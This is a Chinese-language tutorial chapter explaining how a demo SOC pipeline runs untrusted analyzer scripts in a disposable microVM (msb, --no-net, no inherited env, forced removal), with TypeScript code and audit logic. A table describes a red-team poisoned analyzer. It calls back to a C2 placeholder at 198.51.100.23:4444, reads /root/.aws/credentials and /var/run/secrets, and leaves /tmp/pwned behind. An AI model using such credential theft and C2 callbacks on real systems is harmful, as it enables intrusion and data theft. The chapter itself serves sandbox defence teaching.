## 一、操作（位置感）

先摆好攻击模型。富化流水线（2.4）对每个 artifact 挑一个 analyzer 查证——教学替身是
查表，**真跑形态**是每个 analyzer 一个 Python 脚本，放进 microVM 执行。脚本是"外来
代码"：它可能来自第三方情报商、可能被供应链污染、可能被内鬼替换——**毒 analyzer 的
特征是"毒在动作里，不在结果里"**：它照样吐一份合法的 Cortex 结果（分诊看着一切
正常），暗地里干三件事。本项目的红队载荷就躺在
[fixtures/attack/sandbox/01_poisoned_analyzer/analyzer.py](soc-demo/fixtures/attack/sandbox/01_poisoned_analyzer/analyzer.py)：

| 攻击 | 载荷 | 要得手需要穿透的闸 |
|---|---|---|
| 外联 C2 | `connect_ex(("198.51.100.23", 4444))`（TEST-NET-2 占位） | egress：`--no-net` |
| 偷宿主凭证 | 全量 `os.environ` 键名回传 + 直读 `/root/.aws/credentials`、`/var/run/secrets` | env：microVM 不继承宿主 env |
| 落持久化残留 | 写 `/tmp/pwned` | 一次性：跑完即毁 + finally 显式 remove |

**攻击成功判据**（提前钉死）：三件套任一得手（C2 连上 / 宿主凭证值出现在 VM 里 /
残留跨过 VM 边界存活），或毒结果**绕过形状校验**混进富化报告；且台账查不到拦截
痕迹。被拦判据：审计里 `sandbox_egress_blocked` / `sandbox_env_denied` 各一条 DENIED、
`breach` 零条、新 VM 看不到上一台的 /tmp/pwned。

本机布景自检（能不能真跑，探测说了算）：

```bash
which msb && msb --version     # 我实测：/opt/homebrew/bin/msb，版本 0.6.16（探测先行例记录同款）
```

## 二、调用链

全景。毒脚本从进场到被拆，一共五站（②③ 是三道闸所在）：

```
投毒 analyzer（表面吐正常 Cortex 结果）
  │  scriptFor seam 把沙箱执行位换成 fixtures/attack/sandbox/01/analyzer.py
  ▼
① MsbAnalyzerBackend.lookup —— 定位脚本；没脚本 → fail-closed 拒绝，VM 都不开（INV-1）
  ▼
② buildMsbArgs 拼命令行——「拦截机制全部长在参数上」：
  │  msb run python:3.12 --name enrich-vt_lookup-xxxxxxxx
  │    --no-net          ← 闸 1：egress 双向 deny
  │    --no-tty -q --label soc-demo=ticket16 --timeout 120s
  │    --copy analyzer.py:/srv/analyzer.py
  │    --copy-dir fixtures/ti:/srv/ti      ← 情报表挂载：能干活≠能外联
  │    （没有任何 -e/--env ← 闸 2：宿主 env 不进 VM）
  │    -- python /srv/analyzer.py '<call 四元组 JSON>'
  ▼
③ 一次性 microVM 真跑（libkrun）；毒脚本在 VM 里：
  │    外联 C2 → connect_ex 立即 errno=111（宿主侧策略拒绝）
  │    读 env  → 只有镜像最小 env（9 个键），金丝雀值 grep 不到
  │    写 /tmp/pwned → 写得进去，但这台 VM 马上就要没了
  ▼
④ finally: msb remove -f —— 跑完即毁，失败路径也拆；remove 失败记 FAILURE 审计
  ▼
⑤ stdout 协议一行：<<ANALYZER_RESULT>>{result, attempts}
     checkShape：VM 输出是不可信输入，形状不对 refuse（INV-1）
     recordAttempts：拦截 → DENIED 审计；没拦住 → breach FAILURE（审计不说谎）
  ▼
AnalyzerResult 进富化报告——与 FixtureAnalyzerTable 同一接口（seam 换脚不换鞋，2.4）
```

### 站 1 · 三道闸的机制面：拦截长在命令行参数上

📍 大图节点:MSB_ARGS(5.4 毒沙箱)

📄 [services/agent/workers/enrichment/sandbox.ts:7-18](soc-demo/services/agent/workers/enrichment/sandbox.ts#L7)

```ts
// 真跑的形状（PRD v1.1 变更 3「analyzer 按 Cortex 真实架构以可执行脚本形态存在」）：
//   每次 lookup 拉起一台一次性 microVM（msb run，本机 libkrun，非常驻服务），
//   analyzer 脚本 + 情报表只读挂进 VM，脚本真执行、真吐 Cortex 返回契约，跑完即毁。
//   情报源以文件挂载而非 HTTP：egress 全关（--no-net），所以正常 analyzer 也无需外联——
//   「能干活」与「能外联」在这台 VM 里是两件事，这正是第四攻击面要演示的。
//
// 沙箱边界的三道闸（对应票 16 验收 ②③④）：
//   egress  —— msb --no-net：宿主侧网络栈双向 deny，VM 里 connect_ex 立即 errno=111
//             （对照实验：无此旗标的 VM 用户态网络栈会假握手 errno=0——拦截真来自旗标）
//   env     —— microVM 不继承宿主 env：msb 进程 env 里挂金丝雀（INV-4 同款），VM 里 grep 不到
//   一次性  —— msb run 跑完会留 stopped 沙箱，所以 backend 在 finally 里 msb remove -f，
//             失败路径也毁（不留残留），remove 失败本身记 FAILURE 审计
```

这段注释值得整段抄进设计文档。最漂亮的一手是**情报表挂载**：正常 analyzer 查
威胁情报走的是文件（`fixtures/ti` 以 `--copy-dir` 只读挂进 VM），不是 HTTP——所以
"egress 全关"不会误伤正常业务，**功能的活路和安全的死门互不妨碍**。反过来想：如果
analyzer 真需要外联查 VT，egress 闸就得开口子，三道闸立刻瘸一道——闸的设计要在
"业务到底需要什么"上抠，不是在"防御最好看"上抠。

参数本身是个纯函数（CI 没有真 VM 也能断言这张"命令行的形状"）：

📄 [services/agent/workers/enrichment/sandbox.ts:52-77](soc-demo/services/agent/workers/enrichment/sandbox.ts#L52)

```ts
/** msb 命令行拓扑（纯函数）：拦截机制全部长在参数上——--no-net 关 egress、无 -e/--env
 *  即宿主 env 不进 VM、--timeout 兜底短命、具名 + 归属标签供清扫。CI 没有真 VM，
 *  但这张「命令行的形状」是可断言的拓扑承诺。 */
export function buildMsbArgs(spec: MsbArgsSpec): string[] {
  return [
    "run",
    spec.image,
    "--name",
    spec.name,
    "--no-net", // egress 全关（第四攻击面的拦截机制，宿主侧策略拒绝、双向 deny）
    "--no-tty",
    "-q",
    "--label",
    "soc-demo=ticket16", // 归属标签：测试/运维按标签清扫残留沙箱
    "--timeout",
    `${spec.timeoutSecs}s`, // 兜底短命：analyzer 挂死也不许占着 VM
    "--copy",
    `${spec.scriptPath}:/srv/analyzer.py`,
    "--copy-dir",
    `${spec.tiDir}:/srv/ti`,
    "--",
    "python",
    "/srv/analyzer.py",
    JSON.stringify(spec.call), // Cortex 调用四元组原样进 VM
  ];
}
```

逐参数读：`--no-net` 是闸 1；**整张参数表里没有任何 `-e/--env`** 是闸 2（缺省即关——
不传 env 比"传了再过滤"稳得多）；`--name`+`--label`+`--timeout` 服务于闸 3（具名才好
拆、标签才好扫残留、超时防挂死占 VM）。`--copy` 单文件、`--copy-dir` 情报表目录，
`--` 之后是 VM 内真正执行的命令。**把安全属性做成"参数的缺省形状"而不是"运行时的
补丁"，是这口高压锅最值得学的一手。**

### 站 2 · lookup 主流程：fail-closed 开场，finally 收尸

📍 大图节点:LOOKUP(5.4 毒沙箱)

先补一条"这站是怎么被触发的"接缝：生产布景里富化 flow 默认走查表替身
（FixtureAnalyzerTable，2.4），本步**不改一行生产代码**就切到真沙箱——用的是
`MsbAnalyzerBackendDeps` 预留的 `scriptFor` 定位 seam（构造参数注入），教具脚本
`5-4-sandbox-demo.mts` 把执行位换成毒 fixture，再配一个内存审计面接住 DENIED/FAILURE。
触发者是教具进程，观测面是它打印的审计行——运行中的九容器布景零污染。

📄 [services/agent/workers/enrichment/sandbox.ts:141-180](soc-demo/services/agent/workers/enrichment/sandbox.ts#L141)

```ts
  async lookup(analyzer: AnalyzerName, call: AnalyzerCall): Promise<AnalyzerResult> {
    const scriptPath = this.scriptFor(analyzer);
    if (!existsSync(scriptPath)) {
      // fail-closed：没脚本不猜、不开 VM、拒绝执行（INV-1：异常一律拒绝）
      this.record("FAILURE", "sandbox_run_failed", analyzer, { reason: `script_missing:${analyzer}` });
      return this.refused(`script_missing:${analyzer}`);
    }

    const name = `enrich-${analyzer}-${randomUUID().slice(0, 8)}`;
    try {
      let stdout: string;
      try {
        ({ stdout } = await this.run(buildMsbArgs({
          image: this.image,
          name,
          scriptPath,
          tiDir: this.tiDir,
          call,
          timeoutSecs: this.timeoutSecs,
        })));
      } catch (e) {
        return this.failRun(name, analyzer, `vm_error:${errMsg(e)}`);
      }

      const line = stdout.split("\n").find((l) => l.includes(RESULT_MARKER));
      if (!line) return this.failRun(name, analyzer, "no_result_marker");
      let envelope: { result?: unknown; attempts?: VmAttempt[] };
      try {
        envelope = JSON.parse(line.slice(line.indexOf(RESULT_MARKER) + RESULT_MARKER.length));
      } catch {
        return this.failRun(name, analyzer, "bad_result_json");
      }
      const shape = this.checkShape(envelope.result);
      if (!shape.ok) return this.failRun(name, analyzer, shape.reason);
      this.recordAttempts(name, analyzer, envelope.attempts ?? []);
      return shape.result;
    } finally {
      await this.remove(name, analyzer); // 跑完即毁：成功失败都拆（验收 ④ 的机制面）
    }
  }
```

三个读点：①开场就是 fail-closed（没脚本连 VM 都不开——"宁可不出结果不出假结果"）；
②VM 的每条失败路径（跑挂 / 没 marker / JSON 坏 / 形状歪）都汇进 `failRun` 记 FAILURE
审计并返回带原因的 refused 结果——富化报告里出现的是 `sandbox_run_failed:<原因>`，
不是静默吞掉；③**finally 里的 remove 是无条件的**——成功、失败、被拦截，这台 VM 都
必须死。第五站先说④：VM 输出本身也是不可信输入。

📍 大图节点:VM(5.4 毒沙箱)

VM 侧的观测面补两句：这台 microVM 看得见也摸得着——教具跑的瞬间另开终端 `msb list`，
能看到 `enrich-…` 沙箱出现又在数秒内消失（亲手验证 ③）；沙箱里发生了什么，不靠毒脚本
的嘴说——它被要求把外联尝试/env 探测的遥测（attempts）打进 stdout 协议行，由宿主侧
下一站接走记账。

📄 [services/agent/workers/enrichment/sandbox.ts:182-191](soc-demo/services/agent/workers/enrichment/sandbox.ts#L182)

```ts
  /** Cortex 返回契约的最小形状校验：VM 输出是不可信输入，不猜不兜底（INV-1）。 */
  private checkShape(raw: unknown): { ok: true; result: AnalyzerResult } | { ok: false; reason: string } {
    if (typeof raw !== "object" || raw === null) return { ok: false, reason: "bad_result_shape" };
    const r = raw as Record<string, unknown>;
    const taxonomies = (r.summary as { taxonomies?: unknown } | undefined)?.taxonomies;
    if (typeof r.success !== "boolean" || !Array.isArray(taxonomies)) {
      return { ok: false, reason: "bad_result_shape" };
    }
    return { ok: true, result: r as unknown as AnalyzerResult };
  }
```

想想为什么必须这样：投毒 analyzer 完全可以吐一个畸形 JSON 让宿主解析崩掉，或塞进
怪形状的数据污染下游（2.3 的 parseReport 显式验型是同一思想——**代码边界上的每个
输入都当不可信的**，哪怕它来自我们自己拉起的 VM）。

### 站 3 · 遥测与审计：拦截记 DENIED，没拦住记 breach——审计不说谎

📍 大图节点:SHAPE(5.4 毒沙箱)

📄 [services/agent/workers/enrichment/sandbox.ts:193-216](soc-demo/services/agent/workers/enrichment/sandbox.ts#L193)

```ts
  /** 沙箱遥测 → 审计：拦截记 DENIED；「没拦住」记 FAILURE 级 breach（审计不说谎）。 */
  private recordAttempts(name: string, analyzer: AnalyzerName, attempts: VmAttempt[]): void {
    for (const a of attempts) {
      if (a.kind === "egress") {
        const blocked = a.blocked === true;
        this.record(
          blocked ? "DENIED" : "FAILURE",
          blocked ? "sandbox_egress_blocked" : "sandbox_egress_breach",
          name,
          { analyzer, target: a.target, errno: a.errno },
        );
      } else if (a.kind === "env_probe") {
        if (a.found === true) {
          this.record("FAILURE", "sandbox_env_breach", name, { analyzer, detail: a });
        } else {
          this.record("DENIED", "sandbox_env_denied", name, {
            analyzer,
            env_keys: Array.isArray(a.env_keys) ? a.env_keys.length : 0,
            credential_paths_missing: a.credential_paths_missing ?? [],
          });
        }
      }
    }
  }
```

这套遥测协议的聪明处：**拦截的断言不靠投毒脚本的自白，靠宿主侧的独立度量**。VM 里
的攻击脚本汇报 `blocked:false`？宿主记的是 `breach` FAILURE（安全事件级）；它汇报
`blocked:true`？宿主还得自己派探针进**同策略** VM 复测 errno（sandbox.test.ts 验收
2+3 的"独立度量"段）。审计永不采信被审计方的口供——这条通用于一切安全日志设计。

### 站 4 · 能力探测：真跑之前先问环境，skip 要可见

📍 大图节点:PROBE(5.4 毒沙箱)

📄 [services/agent/workers/enrichment/sandbox.ts:262-293](soc-demo/services/agent/workers/enrichment/sandbox.ts#L262)

```ts
export async function msbProbe(
  opts: { msbBin?: string; image?: string } = {},
): Promise<{ ok: true } | { ok: false; reason: string }> {
  const bin = opts.msbBin ?? process.env.MSB_BIN ?? "msb";
  const image = opts.image ?? DEFAULT_IMAGE;
  try {
    await execFile(bin, ["--version"]);
  } catch {
    return {
      ok: false,
      reason: `microsandbox CLI 不可用（${bin} 不在 PATH；CI 无 KVM 属预期）——真跑断言 skip，mock 侧照常全绿`,
    };
  }
  const name = `probe-${randomUUID().slice(0, 8)}`;
  try {
    const { stdout } = await execFile(
      bin,
      [
        "run", image, "--name", name, "--no-net", "--no-tty", "-q",
        "--timeout", "30s", "--label", "soc-demo=ticket16",
        "--", "python", "-c", "print('ok')",
      ],
      { timeout: 120_000 },
    );
    if (!stdout.includes("ok")) return { ok: false, reason: `microVM 冒烟输出异常：${stdout.slice(0, 120)}` };
    return { ok: true };
  } catch (e) {
    return { ok: false, reason: `microVM 冒烟失败——真跑断言 skip：${errMsg(e)}` };
  } finally {
    await execFile(bin, ["remove", "-f", name, "-q"]).catch(() => {}); // 探针 VM 也一次性
  }
}
```

探测两级：先 `msb --version`（CLI 在不在），再**真拉一台冒烟 VM** 跑 `print('ok')`
（虚拟化能不能用——版本号在不代表 VM 开得起来）。每一级失败都返回**带人话原因**的
`ok:false`，绝不静默降级——文件头那句口径（255 行起）："skip 必须可见，不静默"。
这个模式你已经见过一次：5.1 卡 1 里 guards 的 deberta 模型层，注释原话就是
"票 16 msbProbe 先例"。连探针 VM 自己也走一次性纪律（finally remove）。

**本步实测两态**：你这台机器探测**通过**（msb 0.6.16 + 冒烟 VM 真跑 ok，S0 见教具
脚本输出）——所以下节是**真跑战报**；探测失败的形状（CI 无 KVM）用注入坏 msbBin
实测，输出 `{"ok":false,"reason":"microsandbox CLI 不可用（…不在 PATH；CI 无 KVM 属
预期）——真跑断言 skip，mock 侧照常全绿"}`。降级口径一句话：**mock/拓扑断言侧照常
全绿，真跑侧显式 skip 并打印原因**——富化业务由 FixtureAnalyzerTable 供着（默认
backend，2.4），不断供、不装死、也不假装跑过。

## 三、服务与中间件卡

**卡 1 · ▲microsandbox（msb，开源：一次性 microVM CLI）**

- **替我们干了件什么体力活**：给"外来代码"一口**用完即毁的高压锅**。`msb run` 拉起
  一台基于 libkrun 的极简 microVM（非常驻服务，跑完留 stopped 沙箱，`msb remove -f`
  拆掉），`--no-net` 关网、不传 env 就隔离 env、`--copy` 喂文件——把"跑不可信代码"
  从一件危险事变成一条命令行。
- **本项目怎么配置**：不进 compose（agent 宿主机上的 CLI，`MSB_BIN` 可指路径）；镜像
  `python:3.12`（新机器先 `msb pull`）；归属标签 `soc-demo=ticket16` 供清扫。默认
  布景的富化走 FixtureAnalyzerTable——msb 是 seam 的另一只脚，演示攻击面/冒烟时切。
- **市面上同类**：Docker（容器级隔离，共享内核——逃逸面大于 microVM）、Firecracker
  （AWS 的 microVM，重运维）、gVisor（用户态内核拦截）、Cortex 本尊（analyzer 跑在
  Docker worker 里）。隔离强度排序大致：microVM > gVisor > 容器 > 裸跑。
- **本项目为什么选它**：analyzer 是**攻击者可污染路径上的外来代码**（TI 数据、第三方
  脚本），容器隔离的共享内核赌不起；microsandbox 的 CLI 形态又比 Firecracker 轻
  一个数量级，教学机跑得动。且"一次性"与 m3 的一次性票（INV-2）是同一个哲学在
  两个层面的投影：**能重复利用的东西都会被蹲点，一次性的东西只能赌一把**。
- **业务上怎么选**：跑自家可信代码 → 容器够用；跑外来代码/处理不可信文件（沙箱
  分析、文件 detonation）→ microVM 级；要规模化 detonation → VirusTotal 们的外部
  API 或专用沙箱服务（Joe Sandbox/Cuckoo 系），别自己养。

**卡 2（自研模式）· 能力探测三原则：探测先行、skip 可见、不静默降级**

- **它是什么**：本仓的可选真件统一探针模式（msbProbe / deberta model_available /
  真 LLM 冒烟三处同款）：先探测环境有没有真件，有→真断言；没有→返回**带人话原因**
  的 skip，测试打印原因后跳过，mock 侧照常全绿。
- **为什么重要**：反面是"静默降级"——环境缺了，测试悄悄变绿、功能悄悄变薄，没人
  知道防线根本没在岗。2.2 的 guards fail-open 缺口（票 50）本质就是一次"静默降级"
  事故。探测模式把"环境不在场"变成**显式的、可 grep 的、带原因的**状态。
- **市面对照**：pytest 的 skipif、CI 的 conditional job、feature flag 的运行时探测
  （如 WebAssembly 特性检测）。共同纪律：**降级要留痕、要说清为什么、要让上游可感知**。
- **业务上怎么选**：给每个"可选真件"问一句——它缺席时，业务是降级（富化走查表）
  还是失效（注入扫描缺席→对话面关门，5.2）？降级的走探测+skip；失效的走 fail-closed
  拒答。两套口径别混用。

## 四、防线对号

| 防线 | 在本步的落点 |
|---|---|
| **egress 闸**（--no-net） | 毒 analyzer 外联 C2 实测 errno=111；对照实验（无旗标假握手 errno=0）证明拦截真来自旗标 |
| **env 闸**（不传 env） | VM env 只有镜像最小 9 键；宿主金丝雀值（SOC_CANARY_SECRET）VM 里 grep 不到——INV-4 的沙箱版（下一站全链对账） |
| **一次性闸**（finally remove） | 跑完即毁、失败路径也拆；remove 失败记 FAILURE（安全事件级不静默）；新 VM 看不到上一台 /tmp/pwned（实测验收 4） |
| **INV-1**（fail-closed） | 两处：没脚本不开机（script_missing 即拒）；VM 输出形状校验不过即 refuse——VM 里跑的是自己的代码，输出仍当不可信输入 |
| **INV-8**（全链审计） | 拦截 DENIED（egress_blocked/env_denied）、未拦 breach FAILURE、跑挂 sandbox_run_failed、拆毁失败 remove_failed——四类全覆盖，审计不说谎（站 3） |
| **seam 换脚**（2.4 铺垫） | FixtureAnalyzerTable ↔ MsbAnalyzerBackend 同接口，flow 零改动——防线升级不惊动业务代码 |

## 六、捣乱实验（必选）

**攻击判据回顾**：逃逸三件套任一得手 / 毒结果绕过形状校验 / 零拦截痕迹 = 攻击者赢。
主实验（①②）判定：**三闸全拦 + 零 breach + 拦截全程 DENIED 审计**——攻击未遂。
下面三个捣乱换个角度压测边界。

**A · 把毒脚本的"自白"做成假的（审计可信度压测）**：投毒 analyzer 完全可以谎报
遥测（egress 声称 blocked:true 其实偷跑）。防线在哪？读
[sandbox.test.ts](soc-demo/services/agent/workers/enrichment/sandbox.test.ts) 验收 2+3
的"独立度量"段：测试**另派我方探针进同策略 VM**，独立复测 errno 与金丝雀——宿主
侧度量，不采信 VM 内口供。你自己做一遍：把脚本里 `errno != 0` 的断言改成恒真
（改 fixtures 是允许的？**不是**——fixtures 也是只读红线，做法是写你自己的探针脚本
喂给 `msb run`，同款 `--no-net`，看 errno 是不是 111）。判据：只要旗标在，谎报改变
不了 errno；只要审计断言写在宿主侧，谎报只能骗过自己。

**B · 灌一个挂死的 analyzer（超时与资源闸）**：写一个 `while True: pass` 脚本，换上
`scriptFor`（教具脚本改一行）跑 `lookup`——预期 `--timeout 120s` 兜底（或 execFile
的 timeout+60s 兜底）触发，`failRun(vm_error:…)` 记 FAILURE 审计，finally 照拆。
判据：挂死代码占不住 VM、不拖垮富化流水线、拆毁不留残留。（本实验要等 120 秒，
建议只在想看的时候跑一次。）——**一次性 + 超时是一对**：只有一次性，挂死还能耗
你两分钟；只有超时，残留还能留一夜。

**C · 纸面推演：如果 analyzer 真需要外联怎么办**（设计权衡题）：比如接真
VirusTotal API——`--no-net` 就得开。开口子的正确姿势不是"全开"，是**最小出口**：
宿主侧代理（唯一放行的 egress 目标）+ 凭证仍不出 VM（代理侧注入 API key，出站瞬间
即收——跟 gateway 凭证代理同一个思想的沙箱版）+ egress 审计（连过哪、多长、多大）。
对照本系统：LLM 出站也是"业务需要外联"的例子，它的答案是凭证代理 + 金丝雀
（INV-4）——**下一站 5.5 就去对账这条**。

---

**本步收束**：毒 analyzer 的三件套（外联/偷凭证/留后门）在三道闸前全部撞墙——
egress errno 111、VM 里只有 9 个镜像 env 键、残留随 VM 蒸发；毒结果还要过形状校验；
拦截全程 DENIED 审计，谎报无效（宿主侧独立度量）。能力探测让"真跑"与"降级"都有
诚实的形状：本机探测通过就真跑给你看，CI 没有虚拟化就带着人话原因 skip。攻击者的
第四仗：**逃逸零成功，审计两 DENIED**。**下一站 5.5（收官）**：把镜头拉到最后一个
攻击面——**凭证本身**。真 LLM 的 API key 全程住在哪、路过哪、能不能在任何可观测面
被 grep 到？全面对账 INV-4，外加场景 5 闯关三题。
